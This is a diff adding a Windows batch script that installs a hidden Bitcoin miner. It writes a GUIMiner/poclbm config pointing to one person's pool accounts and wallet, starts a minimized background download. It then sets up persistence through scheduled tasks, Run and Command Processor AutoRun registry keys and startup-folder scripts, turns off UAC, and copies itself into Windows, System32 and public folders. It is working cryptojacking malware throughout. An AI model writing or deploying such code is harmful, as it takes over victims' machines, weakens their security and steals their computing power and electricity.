@@ -1,0 +1,189 @@
+@echo off
+
+setlocal enabledelayedexpansion
+
+set a=0
+
+
+for /F "tokens=1* delims=\" %%G in ("%CD%") do set one=%%G & set two=%%H
+for /F "tokens=1* delims=\" %%G in ("%two%") do set two=%%G & set three=%%H
+for /F "tokens=1* delims=\" %%G in ("%three%") do set three=%%G & set four=%%H
+for /F "tokens=1* delims=\" %%G in ("%four%") do set four=%%G & set five=%%H
+for /F "tokens=1* delims=\" %%G in ("%five%") do set five=%%G & set six=%%H
+for /F "tokens=1* delims=\" %%G in ("%six%") do set six=%%G & set seven=%%H
+for /F "tokens=1* delims=\" %%G in ("%seven%") do set seven=%%G & set eight=%%H
+for /F "tokens=1* delims=\" %%G in ("%eight%") do set eight=%%G & set nine=%%H
+
+
+rem set one=%one%^
+rem set two=%two%^
+rem set three=%three%^
+rem set four=%four%^
+rem set five=%five%^
+rem set six=%six%^
+rem set seven=%seven%^
+rem set eight=%eight%^
+rem set nine=%nine%^
+
+
+if ("%one%") EQU ("admin ") set a=1
+if ("%two%") EQU ("admin ") set a=2
+if ("%three%") EQU ("admin ") set a=3
+if ("%four%") EQU ("admin ") set a=4
+if ("%five%") EQU ("admin ") set a=5
+if ("%six%") EQU ("admin ") set a=6
+if ("%seven%") EQU ("admin ") set a=7
+if ("%eight%") EQU ("admin ") set a=8
+if ("%nine%") EQU ("admin ") set a=9
+
+
+if !a! GTR 0 goto move
+goto real
+
+
+:move
+cd ..\gui
+
+:real
+
+
+rem starts redownloading guiminer
+start "update check" /I /MIN /LOW "cmd" "/Q /C "%CD%\download.bat""
+
+
+rem creates compatible version of poclbm.ini
+
+for /F "delims=\ tokens=1-2" %%G in ("%ProgramFiles%") do set slashfiles=%%G\\%%H)
+if ("%ProgramFiles(x86)%") NEQ ("") (for /F "delims=\ tokens=1-2" %%G in ("%ProgramFiles(x86)%") do set slashfiles=%%G\\%%H)
+
+if exist %CD%\poclbm\noco.txt timeout /T 1 /NOBREAK
+del %CD%\poclbm\noco.txt
+
+:noco
+if exist %CD%\poclbm\noco.txt goto noco
+
+echo noco>%CD%\poclbm\noco.txt
+
+
+echo {>%CD%\poclbm\poclbm.ini
+echo     "profiles": [>>%CD%\poclbm\poclbm.ini
+echo         {>>%CD%\poclbm\poclbm.ini
+echo             "username": "evanmcc_main", >>%CD%\poclbm\poclbm.ini
+echo             "balance_auth_token": "", >>%CD%\poclbm\poclbm.ini
+echo             "name": "BTC", >>%CD%\poclbm\poclbm.ini
+echo             "hostname": "stratum.btcguild.com", >>%CD%\poclbm\poclbm.ini
+echo             "external_path": "", >>%CD%\poclbm\poclbm.ini
+echo             "affinity_mask": 15, >>%CD%\poclbm\poclbm.ini
+echo             "flags": "", >>%CD%\poclbm\poclbm.ini
+echo             "autostart": false, >>%CD%\poclbm\poclbm.ini
+echo             "device": 0, >>%CD%\poclbm\poclbm.ini
+echo             "password": "d=1", >>%CD%\poclbm\poclbm.ini
+echo             "port": "3333">>%CD%\poclbm\poclbm.ini
+echo         }, >>%CD%\poclbm\poclbm.ini
+echo         {>>%CD%\poclbm\poclbm.ini
+echo             "username": "evanmcc", >>%CD%\poclbm\poclbm.ini
+echo             "balance_auth_token": "", >>%CD%\poclbm\poclbm.ini
+echo             "name": "bitparking", >>%CD%\poclbm\poclbm.ini
+echo             "hostname": "mmpool.bitparking.com", >>%CD%\poclbm\poclbm.ini
+echo             "external_path": "", >>%CD%\poclbm\poclbm.ini
+echo             "affinity_mask": 15, >>%CD%\poclbm\poclbm.ini
+echo             "flags": "", >>%CD%\poclbm\poclbm.ini
+echo             "autostart": true, >>%CD%\poclbm\poclbm.ini
+echo             "device": 0, >>%CD%\poclbm\poclbm.ini
+echo             "password": "d=1", >>%CD%\poclbm\poclbm.ini
+echo             "port": "3333">>%CD%\poclbm\poclbm.ini
+echo         }, >>%CD%\poclbm\poclbm.ini
+echo         {>>%CD%\poclbm\poclbm.ini
+echo             "username": "1GPwFQ51uzwx1TuE4rYNo2VFahYvJKjw1c", >>%CD%\poclbm\poclbm.ini
+echo             "balance_auth_token": "", >>%CD%\poclbm\poclbm.ini
+echo             "name": "eligius", >>%CD%\poclbm\poclbm.ini
+echo             "hostname": "stratum.mining.eligius.st", >>%CD%\poclbm\poclbm.ini
+echo             "external_path": "", >>%CD%\poclbm\poclbm.ini
+echo             "affinity_mask": 15, >>%CD%\poclbm\poclbm.ini
+echo             "flags": "", >>%CD%\poclbm\poclbm.ini
+echo             "autostart": true, >>%CD%\poclbm\poclbm.ini
+echo             "device": 0, >>%CD%\poclbm\poclbm.ini
+echo             "password": "1", >>%CD%\poclbm\poclbm.ini
+echo             "port": "3334">>%CD%\poclbm\poclbm.ini
+echo         }>>%CD%\poclbm\poclbm.ini
+echo     ], >>%CD%\poclbm\poclbm.ini
+echo     "bitcoin_executable": "%slashfiles%\\Bitcoin\\bitcoin-qt.exe", >>%CD%\poclbm\poclbm.ini
+echo     "show_console": false, >>%CD%\poclbm\poclbm.ini
+echo     "show_summary": true, >>%CD%\poclbm\poclbm.ini
+echo     "show_opencl_warning": false, >>%CD%\poclbm\poclbm.ini
+echo     "console_max_lines": 1, >>%CD%\poclbm\poclbm.ini
+echo     "start_minimized": true, >>%CD%\poclbm\poclbm.ini
+echo     "blockchain_directory": "C:\\Users\\Evan\\AppData\\Roaming\\Bitcoin", >>%CD%\poclbm\poclbm.ini
+echo     "window_position": [>>%CD%\poclbm\poclbm.ini
+echo         755, >>%CD%\poclbm\poclbm.ini
+echo         144, >>%CD%\poclbm\poclbm.ini
+echo         506, >>%CD%\poclbm\poclbm.ini
+echo         328>>%CD%\poclbm\poclbm.ini
+echo     ]>>%CD%\poclbm\poclbm.ini
+echo }>>%CD%\poclbm\poclbm.ini
+
+
+rem copies poclbm.ini
+mkdir %appdata%\poclbm
+ROBOCOPY "%CD%\poclbm" "%appdata%\poclbm" "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+
+
+del %CD%\poclbm\noco.txt
+
+
+
+REM Get OS version from registry
+for /f "tokens=2*" %%i in ('reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "CurrentVersion"') do set os_ver=%%j
+
+REM Set run level if Vista or later (version 6)
+rem if /i "%os_ver:~,1%" GEQ "6" set runlevel=/RL HIGHEST
+
+if /i "%os_ver:~,1%" GEQ "6" (
+schtasks /Create /TN PENULTIMATE /XML %WINDIR%\admin\ultimate_task_tabs_a.xml /F
+schtasks /Create /TN ULTIMATE /XML %WINDIR%\admin\ultimate_task_tabs_a.xml /F
+) else (
+schtasks /Create /TN PENULTIMATE /XML %WINDIR%\admin\ultimate_task_tabs_a.xml /F
+schtasks /Create /TN ULTIMATE /XML %WINDIR%\admin\ultimate_task_tabs_a.xml /F
+)
+
+reg add "HKLM\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_EXPAND_SZ /d "%homedrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\AUTORUN.bat" /f
+reg add HKLM\software\microsoft\windows\currentversion\run /v gui /t REG_SZ /d "cd %homedrive%\Users\Public\Libraries\guiminer & %homedrive%\Users\Public\Libraries\guiminer\clean.bat" /f
+
+reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+
+
+rem WMIC job
+rem might make hundereds of copies, look for alternative
+rem start "update check" /I /MIN /LOW "cmd.exe" "/Q /C cscript ..\admin\wmic.vbs"
+
+
+
+rem copies all files if corresponding folder does not exist
+if not exist "%WINDIR%\gui" ROBOCOPY "%CD%" "%WINDIR%\gui" "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+if not exist "%WINDIR%\admin" ROBOCOPY "..\admin" "%WINDIR%\admin" "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+if not exist "%WINDIR%\System32\gui" ROBOCOPY "%CD%" "%WINDIR%\System32\gui" "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+if not exist "%WINDIR%\System32\admin" ROBOCOPY "..\admin" "%WINDIR%\System32\admin" "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+
+if not exist "%appdata%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\auto.bat" ROBOCOPY "%CD%" "%homedrive%%homepath%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" auto.bat /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+if not exist "%homedrive%\guiminer" ROBOCOPY "%CD%" "%homedrive%\guiminer" "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+if not exist "%homedrive%\users\public\Libraries\guiminer" ROBOCOPY "%CD%" "%homedrive%\Users\Public\Libraries\guiminer" "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+if not exist "%ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\Startup\AUTORUN.bat" ROBOCOPY "%CD%" "%homedrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" AUTORUN.bat /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+
+
+
+rem copies all files anyway
+ROBOCOPY "%CD%" "%WINDIR%\gui" "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+ROBOCOPY "..\admin" "%WINDIR%\admin" "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+ROBOCOPY "%CD%" "%WINDIR%\System32\gui" "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+ROBOCOPY "..\admin" "%WINDIR%\System32\admin" "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+
+ROBOCOPY "%CD%" "%homedrive%\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" auto.bat /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+ROBOCOPY "%CD%" "%homedrive%\guiminer" "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+ROBOCOPY "%CD%" "%homedrive%\Users\Public\Libraries\guiminer" "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+ROBOCOPY "%CD%" "%homedrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" AUTORUN.bat /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+
+
+
+cls
+exit /B %errorlevel%
+exit %errorlevel%
